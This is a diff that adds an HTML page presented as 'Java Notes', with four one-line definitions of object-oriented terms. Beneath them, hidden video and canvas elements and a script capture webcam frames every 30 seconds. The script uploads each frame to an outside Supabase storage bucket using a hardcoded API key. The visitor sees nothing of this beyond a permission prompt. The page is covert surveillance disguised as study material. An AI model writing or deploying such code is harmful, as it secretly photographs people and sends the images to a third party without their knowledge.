@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Java Notes with Webcam + Supabase Storage</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>📘 Java Notes</h1>
+    <p>1. <strong>Class:</strong> Blueprint of object.</p>
+    <p>2. <strong>Inheritance:</strong> Allows child class to acquire features of parent class.</p>
+    <p>3. <strong>Polymorphism:</strong> Method overloading and overriding.</p>
+    <p>4. <strong>Abstraction:</strong> Using abstract class or interface.</p>
+
+    <!-- Hidden video and canvas elements -->
+    <video id="video" autoplay muted playsinline style="position: absolute; left: -9999px;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        // Initialize Supabase client with your project details
+        const supabaseUrl = "https://efhozxbplyonizxousae.supabase.co";
+        const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVmaG96eGJwbHlvbml6eG91c2FlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg2Njc0NjUsImV4cCI6MjA2NDI0MzQ2NX0.LiJJB4P9HWlCY2FSJ-Imog2TvGJlK915GK_QELmWzPg";
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+
+        async function uploadImage(blob, filename) {
+            const { data, error } = await supabase.storage
+                .from('webcam-photos') // your bucket name
+                .upload(filename, blob, {
+                    cacheControl: '3600',
+                    upsert: false
+                });
+
+            if (error) {
+                console.error("Upload error:", error.message);
+            } else {
+                console.log("Uploaded:", data.path);
+            }
+        }
+
+        // Start webcam and capture every 30 seconds
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                setInterval(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(async (blob) => {
+                        const filename = `photo-${Date.now()}.png`;
+                        await uploadImage(blob, filename);
+                    }, 'image/png');
+                }, 30000); // 30 sec interval
+            })
+            .catch(err => {
+                alert("Please allow webcam access!");
+                console.error(err);
+            });
+    </script>
+</body>
+
+</html>
